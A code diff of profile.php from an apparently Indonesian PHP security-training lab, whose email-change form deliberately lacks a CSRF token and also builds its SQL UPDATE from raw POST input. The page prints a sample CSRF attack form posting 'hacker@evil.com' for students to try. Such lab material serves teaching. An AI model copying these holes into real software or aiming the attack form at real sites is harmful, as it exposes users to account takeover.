@@ -1,108 +1,67 @@
 <?php
-// profile.php
+session_start();
+$base_path = './';
 include 'db.php';
 
-// Cek Login
 if (!isset($_SESSION['user_id'])) {
     header("Location: login.php");
     exit;
 }
 
-// --- LOGIKA GANTI EMAIL (TARGET CSRF) ---
-if (isset($_POST['ganti_email'])) {
-    $new_email = $_POST['email'];
-    $id = $_SESSION['user_id'];
+$id = $_SESSION['user_id'];
+$user_query = mysqli_query($conn, "SELECT * FROM users WHERE id=$id");
+$user = mysqli_fetch_assoc($user_query);
 
-    // VULNERABLE: Tidak ada token CSRF
-    mysqli_query($conn, "UPDATE users SET email='$new_email' WHERE id=$id");
-    $msg = "Email berhasil diubah menjadi: $new_email";
+$msg = "";
+
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $new_email = $_POST['email'];
+    // VULNERABILITY: No CSRF Token check!
+    // This form accepts POST requests from ANY origin.
+    if (mysqli_query($conn, "UPDATE users SET email='$new_email' WHERE id=$id")) {
+        $msg = "Email berhasil diupdate!";
+        $_SESSION['email'] = $new_email;
+    } else {
+        $msg = "Gagal update email: " . mysqli_error($conn);
+    }
 }
 
-// Ambil data user terbaru
-$id = $_SESSION['user_id'];
-$result = mysqli_query($conn, "SELECT * FROM users WHERE id=$id");
-$user = mysqli_fetch_assoc($result);
+include 'includes/header.php';
 ?>
 
-<!DOCTYPE html>
-<html lang="id">
+<div class="card">
+    <h1>Profil Pengguna</h1>
+    
+    <?php if ($msg): ?>
+        <div class="alert alert-info"><?= $msg ?></div>
+    <?php endif; ?>
 
-<head>
-    <title>Dashboard User</title>
-    <style>
-        body {
-            font-family: sans-serif;
-            max-width: 800px;
-            margin: 20px auto;
-            line-height: 1.6;
-        }
+    <p>Halo, <strong><?= htmlspecialchars($user['username']) ?></strong>!</p>
+    <p>Email saat ini: <code><?= htmlspecialchars($user['email']) ?></code></p>
+    <p>Role: <span class="badge"><?= htmlspecialchars($user['role']) ?></span></p>
 
-        .nav-box {
-            background: #e3f2fd;
-            padding: 15px;
-            border-radius: 5px;
-            border: 1px solid #90caf9;
-            margin-bottom: 20px;
-        }
+    <hr style="margin: 2rem 0; border: 0; border-top: 1px solid var(--border);">
 
-        .nav-box a {
-            text-decoration: none;
-            color: #1565c0;
-            font-weight: bold;
-            margin-right: 15px;
-        }
-
-        .nav-box a:hover {
-            text-decoration: underline;
-        }
-
-        .role-badge {
-            background: #333;
-            color: #fff;
-            padding: 2px 6px;
-            border-radius: 4px;
-            font-size: 0.8em;
-        }
-
-        .form-box {
-            border: 1px solid #ddd;
-            padding: 20px;
-            border-radius: 5px;
-        }
-
-        .success {
-            color: green;
-            font-weight: bold;
-        }
-    </style>
-</head>
-
-<body>
-
-    <h1>Halo, <?= $user['username']; ?> <span class="role-badge"><?= $user['role']; ?></span></h1>
-
-    <div class="nav-box">
-        <p><strong>📂 Menu Praktikum:</strong></p>
-        <a href="ssrf.php">1. Lab SSRF</a>
-        <a href="idor.php">2. Lab IDOR (BAC)</a>
-        <a href="admin_panel.php">3. Lab Admin Panel (BAC)</a>
-        <a href="logout.php" style="color:red; float:right;">Keluar (Logout)</a>
+    <h3>Ganti Email</h3>
+    <div class="alert alert-info">
+        <strong>📚 Panduan Percobaan:</strong>
+        <p>Form ini tidak memiliki CSRF Token. Artinya, website lain bisa mengirim request 'Ganti Email' atas nama Anda.</p>
+        <p style="margin-top:0.5rem"><strong>Cara Membuktikan:</strong></p>
+        <code style="display:block; background:#fff; padding:10px; margin:5px 0; font-size: 0.85em; border:1px solid #ddd;">
+            &lt;!-- Simpan sebagai attack.html --&gt;<br>
+            &lt;form action="http://localhost/security-labs/profile.php" method="POST"&gt;<br>
+            &nbsp;&nbsp;&lt;input type="hidden" name="email" value="hacker@evil.com"&gt;<br>
+            &nbsp;&nbsp;&lt;input type="submit" value="Klik Saya"&gt;<br>
+            &lt;/form&gt;
+        </code>
+        <p>Simpan kode di atas sebagai file HTML baru di komputer Anda, lalu buka dan klik tombolnya saat Anda sedang login di sini.</p>
     </div>
+    
+    <form method="POST" action="profile.php">
+        <label>Email Baru:</label>
+        <input type="email" name="email" required placeholder="email@baru.com">
+        <button type="submit" class="btn">Simpan Perubahan</button>
+    </form>
+</div>
 
-    <div class="form-box">
-        <h3>👤 Profil Saya</h3>
-        <p>Email saat ini: <strong><?= $user['email']; ?></strong></p>
-
-        <?php if (isset($msg)) echo "<p class='success'>$msg</p>"; ?>
-
-        <h4>Ganti Email (Target CSRF)</h4>
-        <form method="POST" action="profile.php">
-            <input type="email" name="email" required placeholder="email@baru.com">
-            <button type="submit" name="ganti_email">Update Email</button>
-        </form>
-        <p><small><em>Note: Form ini tidak memiliki CSRF Token.</em></small></p>
-    </div>
-
-</body>
-
-</html>
+<?php include 'includes/footer.php'; ?>
